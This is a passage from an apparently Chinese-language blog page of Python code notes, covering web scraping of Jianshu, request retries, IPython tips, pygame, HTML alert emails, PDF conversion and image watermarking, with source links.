class="keyword">while</span> True:</span><br><span class="line">    text = browser.find_element_by_xpath(<span class="string">""</span><span class="string">"//*[@id="</span>list-container<span class="string">"]/ul"</span><span class="string">""</span>).text</span><br><span class="line">    file.write(text)</span><br><span class="line">    # remove li elements</span><br><span class="line">    js=<span class="string">''</span><span class="string">'var nodeList=document.querySelectorAll("#list-container &gt; ul &gt; li");for(var i=0;i&lt;nodeList.length-1;i++)&#123;nodeList[i].remove()&#125;'</span><span class="string">''</span></span><br><span class="line">    browser.execute_script(js)</span><br><span class="line">    </span><br><span class="line">    # scroll</span><br><span class="line">    browser.execute_script(<span class="string">"document.documentElement.scrollTop=0"</span>)</span><br><span class="line">    browser.execute_script(<span class="string">"document.documentElement.scrollTop=1600"</span>)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'加入了简书'</span> <span class="keyword">in</span> text:</span><br><span class="line">        print(<span class="string">"end"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">file.write(text)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
<h3 id="retrying-重试请求"><a href="#retrying-重试请求" class="headerlink" title="retrying 重试请求"></a>retrying 重试请求</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pip install retrying</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@retry(stop_max_attempt_number=3) # 表示重试以下代码三次</span><br><span class="line">def _parse_url(url):</span><br><span class="line">    print(<span class="string">"-"</span> * <span class="number">30</span>)</span><br><span class="line">    response = requests.get(url, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">    assert response.status_code == <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line">def parse_url(url):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html_str = _parse_url(url)</span><br><span class="line">    except:</span><br><span class="line">        html_str = None</span><br><span class="line">    <span class="keyword">return</span> html_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">'www.baidu.com'</span></span><br><span class="line">    print(parse_url(url))</span><br><span class="line">    </span><br><span class="line">    https:<span class="comment">//learnku.com/articles/33001</span></span><br></pre></td></tr></table></figure>
<h3 id="ipython"><a href="#ipython" class="headerlink" title="ipython"></a>ipython</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">使用 Tab 实现自动补全功能。</span><br><span class="line">使用问号？呈现对象的说明。</span><br><span class="line">提供了一系列以 % 开头的魔术命令为常见任务的执行提供便利。</span><br><span class="line">提供了额外的绘图功能。</span><br><span class="line">可使用操作系统中的命令。</span><br><span class="line">用 %quickref 查看 IPython 的参考手册，也可以使用 %magic 来查看 IPython 中魔术命令的信息，以更好的使用 IPython 工具。</span><br><span class="line">最近两次执行的结果 (Out) 分别保存在 _ 及 __ 变量中。而且，IPython 还采用 _iN, _N 的方式将所有输入及输出的历史记录进行保存～其中 N 为行号</span><br><span class="line"></span><br><span class="line">In [8]: eval(_i4) # eval('1 + 7*9')</span><br><span class="line">Out[<span class="number">8</span>]: <span class="number">64</span> </span><br><span class="line"> IPython 中执行过的命令，可通过 %logstart 将之保存在 Python 文件中</span><br><span class="line"> In [<span class="number">22</span>]: !ls</span><br><span class="line"> IPython.md                      data_science.md                 pandas.ipynb</span><br><span class="line"> Jupyter.ipynb                   README.md</span><br><span class="line"> </span><br><span class="line"> IPython 同样提供了一些代码分析工具，如代码执行时间的分析工具 %time 和 %timeit、基本的性能分析 %prun 和 %run -p 等</span><br><span class="line"> </span><br><span class="line"> %time：整体执行一次，给出执行时间；</span><br><span class="line"> %timeit：多次执行，给出平均时间。</span><br><span class="line"> In [<span class="number">42</span>]: %time <span class="string">'foobar'</span>.startswith(<span class="string">'foo'</span>)</span><br><span class="line"> CPU times: user <span class="number">3</span> µs, <span class="attr">sys</span>: <span class="number">0</span> ns, <span class="attr">total</span>: <span class="number">3</span> µs</span><br><span class="line"> Wall time: <span class="number">5.96</span> µs</span><br><span class="line"> Out[<span class="number">42</span>]: True</span><br><span class="line"> https:<span class="comment">//learnku.com/articles/33122#reply105653</span></span><br></pre></td></tr></table></figure>
<h3 id="列表中出现次数最多的数"><a href="#列表中出现次数最多的数" class="headerlink" title="列表中出现次数最多的数"></a>列表中出现次数最多的数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">test = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>]</span><br><span class="line">print(max(set(test), key=test.count))</span><br></pre></td></tr></table></figure>
<h3 id="pygame-模块"><a href="#pygame-模块" class="headerlink" title="pygame 模块"></a>pygame 模块</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span>*</span><br><span class="line">pygame.init()</span><br><span class="line">size = (600,400) #窗口的大小</span><br><span class="line">screem = pygame.display.set_mode(size) #把窗口的大小放进pygame.display.set_mode()函数里进行创建。</span><br><span class="line">screem.fill((<span class="number">250</span>,<span class="number">250</span>,<span class="number">250</span>))</span><br><span class="line">写好了，但是窗口还是黑色，那是因为窗口还没刷新，用 pygame.display.update () 来进行刷新</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33209#reply105837</span></span><br></pre></td></tr></table></figure>
<h3 id="发送html格式邮件"><a href="#发送html格式邮件" class="headerlink" title="发送html格式邮件"></a>发送html格式邮件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"><span class="keyword">import</span> smtplib, time, os</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"></span><br><span class="line">def send_mail_html(file):</span><br><span class="line">    sender = 'admin@jinchuang.org' #发件人</span><br><span class="line">    receiver = 'gaojing@jinchuang.org' #收件人</span><br><span class="line">    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())  #获取当前时间</span><br><span class="line">    subject = '博客磁盘使用报警_' + t  #邮件主题</span><br><span class="line">    smtpserver = 'smtp.exmail.qq.com' #发送服务器地址</span><br><span class="line">    username = 'admin@jinchuang.org' #用户名</span><br><span class="line">    password = 'passwd' #密码</span><br><span class="line"></span><br><span class="line">    f = open(file, <span class="string">'rb'</span>)</span><br><span class="line">    mail_body = f.read()</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    msg = MIMEText(mail_body, _subtype=<span class="string">'html'</span>, _charset=<span class="string">'utf-8'</span>)</span><br><span class="line">    msg[<span class="string">'Subject'</span>] = Header(subject, <span class="string">'utf-8'</span>)</span><br><span class="line">    msg[<span class="string">'From'</span>] = sender</span><br><span class="line">    msg[<span class="string">'To'</span>] = receiver</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        smtp = smtplib.SMTP()</span><br><span class="line">        smtp.connect(smtpserver)</span><br><span class="line">        smtp.login(username, password)</span><br><span class="line">        smtp.sendmail(sender, receiver, msg.as_string())</span><br><span class="line">    except:</span><br><span class="line">        print(<span class="string">"邮件发送失败！"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"邮件发送成功！"</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        smtp.quit()</span><br><span class="line"></span><br><span class="line">file = '/tmp/df.html' #html文件</span><br><span class="line">send_mail_html(file)</span><br><span class="line"></span><br><span class="line">html表格模板</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=<span class="string">`ifconfig |grep -v 127 |grep inet|awk '&#123;print $2&#125;'`</span></span><br><span class="line">a=<span class="string">`df -hT|grep -w "/"|awk '&#123;print $1&#125;'`</span></span><br><span class="line">b=<span class="string">`df -hT|grep -w "/"|awk '&#123;print $2&#125;'`</span></span><br><span class="line">c=<span class="string">`df -hT|grep -w "/"|awk '&#123;print $3&#125;'`</span></span><br><span class="line">d=<span class="string">`df -hT|grep -w "/"|awk '&#123;print $4&#125;'`</span></span><br><span class="line">e=<span class="string">`df -hT|grep -w "/"|awk '&#123;print $5&#125;'`</span></span><br><span class="line">f=<span class="string">`df -hT|grep -w "/"|awk '&#123;print $6&#125;'`</span></span><br><span class="line">g=<span class="string">`df -hT|grep -w "/"|awk '&#123;print $7&#125;'`</span></span><br><span class="line"></span><br><span class="line">html=<span class="string">"&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;style type=\"text/css\"&gt;</span></span><br><span class="line"><span class="string">table&#123;margin-top:5%;width:500px&#125;</span></span><br><span class="line"><span class="string">table.gridtable &#123;</span></span><br><span class="line"><span class="string">    font-family: verdana,arial,sans-serif;</span></span><br><span class="line"><span class="string">    font-size:14px;</span></span><br><span class="line"><span class="string">    color:#333333;</span></span><br><span class="line"><span class="string">    border-width: 1px;</span></span><br><span class="line"><span class="string">    border-color: #666666;</span></span><br><span class="line"><span class="string">    border-collapse: collapse;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">table.gridtable th &#123;</span></span><br><span class="line"><span class="string">    border-width: 1px;</span></span><br><span class="line"><span class="string">    padding: 8px;</span></span><br><span class="line"><span class="string">    background-color: #008eff;</span></span><br><span class="line"><span class="string">    color:#fff;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">table.gridtable td &#123;</span></span><br><span class="line"><span class="string">    border-width: 1px;</span></span><br><span class="line"><span class="string">    padding: 8px;</span></span><br><span class="line"><span class="string">    border-style: solid;</span></span><br><span class="line"><span class="string">    border-color: #afafaf;</span></span><br><span class="line"><span class="string">    background-color: #ffffff;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">table tr:first-child td:first-child, table tr:first-child th:first-child&#123;</span></span><br><span class="line"><span class="string">  border-top-left-radius: 5px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">table tr:first-child td:last-child, table tr:first-child th:last-child&#123;</span></span><br><span class="line"><span class="string">  border-top-right-radius: 5px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;table class=\"gridtable\" align=center&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">    &lt;th colspan="</span><span class="number">7</span><span class="string">"&gt;告警主机:192.168.11.1&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">    &lt;td&gt;文件系统&lt;/td&gt;&lt;td&gt;类型&lt;/td&gt;&lt;td&gt;总共&lt;/td&gt;&lt;td&gt;已用&lt;/td&gt;&lt;td&gt;可用&lt;/td&gt;&lt;td&gt;使用率&lt;/td&gt;&lt;td&gt;挂载点&lt;/td&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">    &lt;td&gt;$a&lt;/td&gt;&lt;td&gt;$b&lt;/td&gt;&lt;td&gt;$c&lt;/td&gt;&lt;td&gt;$d&lt;/td&gt;&lt;td&gt;$e&lt;/td&gt;&lt;td style=\"color:red;font-weight:bold\"&gt;$f&lt;/td&gt;&lt;td&gt;$g&lt;/td&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/table&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;"</span></span><br><span class="line">echo -e <span class="string">"$html"</span> &gt;<span class="regexp">/tmp/</span>df.html</span><br><span class="line"></span><br><span class="line">如果需要使用ssl协议，修改<span class="number">2</span>个地方</span><br><span class="line">smtpserver = 'smtp.exmail.qq.com:465' #加上465端口</span><br><span class="line">smtp = smtplib.SMTP_SSL() #加上ssl</span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/272.html</span></span><br></pre></td></tr></table></figure>
<h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"></span><br><span class="line">pdfkit.from_file(<span class="string">'jianshu.htm'</span>,<span class="string">'out.pdf'</span>)   </span><br><span class="line">pdfkit.from_string(<span class="string">'HelloWorld'</span>,<span class="string">'out.pdf'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'jianshu.htm'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	pdfkit.from_file(f,<span class="string">'out.pdf'</span>)   </span><br><span class="line">	pdfkit.from_url([<span class="string">'https://www.jianshu.com/'</span>,<span class="string">'https://www.baidu.com/'</span>],<span class="string">'out.pdf'</span>)</span><br><span class="line">    </span><br><span class="line">    #pdfkit.from_file(['jianshu.htm','jianshu1.htm'],'out.pdf')  </span><br><span class="line">    </span><br><span class="line">     options=&#123;</span><br><span class="line">        'page-size':'A4',#Letter</span><br><span class="line">         <span class="string">'margin-top'</span>:<span class="string">'0.75in'</span>,</span><br><span class="line">         <span class="string">'margin-right'</span>:<span class="string">'0.75in'</span>,</span><br><span class="line">         <span class="string">'margin-bottom'</span>:<span class="string">'0.75in'</span>,</span><br><span class="line">         <span class="string">'margin-left'</span>:<span class="string">'0.75in'</span>,</span><br><span class="line">         <span class="string">'encoding'</span>:<span class="string">"UTF-8"</span>,</span><br><span class="line">         <span class="string">'no-outline'</span>:None</span><br><span class="line">     &#125;    </span><br><span class="line">     pdfkit.from_url(<span class="string">'https://www.jianshu.com/'</span>,<span class="string">'out1.pdf'</span>, options=options)</span><br><span class="line">     </span><br><span class="line">     https:<span class="comment">//juejin.im/post/5ce69794e51d4577523f22ef</span></span><br></pre></td></tr></table></figure>
<h3 id="天善博客内容如何转成PDF文档"><a href="#天善博客内容如何转成PDF文档" class="headerlink" title="天善博客内容如何转成PDF文档"></a>天善博客内容如何转成PDF文档</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wkhtmltopdf  <span class="string">'http://www.flybi.net/blog/seng/3645'</span> <span class="string">'http://www.flybi.net/blog/seng/3599'</span>  sengblog.pdf</span><br><span class="line"></span><br><span class="line">wkhtmltopdf  --javascript-delay <span class="number">2000</span> <span class="string">'http://www.flybi.net/blog/seng/3645'</span> <span class="string">'http://www.flybi.net/blog/seng/3599'</span>  sengblog.pdf</span><br><span class="line"></span><br><span class="line">wkhtmltopdf  --dump-outline out.xsl  toc <span class="string">'http://www.flybi.net/blog/seng/3645'</span> <span class="string">'http://www.flybi.net/blog/seng/3599'</span>  sengblog.pdf</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//ask.hellobi.com/blog/seng/3691</span></span><br></pre></td></tr></table></figure>
<h3 id="如何批量添加图片水印"><a href="#如何批量添加图片水印" class="headerlink" title="如何批量添加图片水印"></a>如何批量添加图片水印</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">python 利用opencv去除图片水印 https:<span class="comment">//mp.weixin.qq.com/s/BqeBk0oPP1KpueviCwZFFQ</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//mp.weixin.qq.com/s/QnMzvq_VWs2HyKHhD4FxQg</span></span><br><span class="line"><span class="keyword">import</span> os,traceback</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"># 获取文件夹图片</span><br><span class="line">def get_folder(fpath,wm_file,save_path):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        img_suffix_list = [<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'bmp'</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(fpath):</span><br><span class="line">            <span class="keyword">if</span> i.split(<span class="string">'.'</span>)[<span class="number">-1</span>] <span class="keyword">in</span> img_suffix_list:</span><br><span class="line">                img_path = fpath + <span class="string">'/'</span> + i</span><br><span class="line">                img_water_mark(img_file=img_path,wm_file=wm_file,save_path=save_path)</span><br><span class="line">    except Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(traceback.print_exc())</span><br><span class="line"></span><br><span class="line"># 图片添加水印</span><br><span class="line">def img_water_mark(img_file, wm_file,save_path):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        img = Image.open(img_file)  # 打开图片</span><br><span class="line">        watermark = Image.open(wm_file)  # 打开水印</span><br><span class="line">        img_size = img.size</span><br><span class="line">        wm_size = watermark.size</span><br><span class="line">        # 如果图片大小小于水印大小</span><br><span class="line">        <span class="keyword">if</span> img_size[<span class="number">0</span>] &amp;lt; wm_size[<span class="number">0</span>]:</span><br><span class="line">            watermark.resize(tuple(map(lambda x: int(x * <span class="number">0.5</span>), watermark.size)))</span><br><span class="line">        print(<span class="string">'图片大小：'</span>, img_size)</span><br><span class="line">        wm_position = (img_size[0]-wm_size[0],img_size[1]-wm_size[1]) # 默认设定水印位置为右下角</span><br><span class="line">        layer = Image.new('RGBA', img.size)  # 新建一个图层</span><br><span class="line">        layer.paste(watermark, wm_position)  # 将水印图片添加到图层上</span><br><span class="line">        mark_img = Image.composite(layer, img, layer)</span><br><span class="line">        new_file_name = <span class="string">'/new_'</span>+img_file.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">        mark_img.save(save_path + new_file_name)</span><br><span class="line">    except Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(traceback.print_exc())</span><br></pre></td></tr></table></figure>
<h3 id="爬虫简书"><a href="#爬虫简书" class="headerlink" title="爬虫简书"></a>爬虫简书</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">my_header = <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=<span class="string">'https://www.jianshu.com/users/5aa8494a18c8/timeline'</span>, headers=&#123;<span class="string">'user-agent'</span>: my_header&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'666'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    print(<span class="string">'found'</span>)</span><br><span class="line">page = etree.HTML(res.text)</span><br><span class="line">last_li = page.xpath(<span class="string">''</span><span class="string">'//ul[@class="note-list"]/li[last()]'</span><span class="string">''</span>)[<span class="number">0</span>]</span><br><span class="line">max_id = int(last_li.get(<span class="string">'id'</span>).split(<span class="string">'-'</span>)[<span class="number">1</span>]) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"activity.txt"</span>,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">page = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    res = requests.get(url=<span class="string">'https://www.jianshu.com/users/5aa8494a18c8/timeline?max_id=%s&amp;page=%s'</span> %(max_id,page),</span><br><span class="line">        headers=&#123;<span class="string">'user-agent'</span>: my_header, <span class="string">'X-INFINITESCROLL'</span>:<span class="string">'true'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    last_li = etree.HTML(res.text).xpath(<span class="string">''</span><span class="string">'/html/body/li[last()]'</span><span class="string">''</span>)[<span class="number">0</span>]</span><br><span class="line">    max_id = int(last_li.get(<span class="string">'id'</span>).split(<span class="string">'-'</span>)[<span class="number">1</span>]) - <span class="number">1</span></span><br><span class="line">    page = page + <span class="number">1</span></span><br><span class="line">    file.write(res.text)</span><br><span class="line">    file.write(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'加入了简书'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'end'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">file.close()</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/35a85ee14f7b</span></span><br></pre></td></tr></table></figure>
<h3 id="markdown-转PDF"><a href="#markdown-转PDF" class="headerlink" title="markdown 转PDF"></a>markdown 转PDF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">pip install markdown </span><br><span class="line">markdown.markdown() 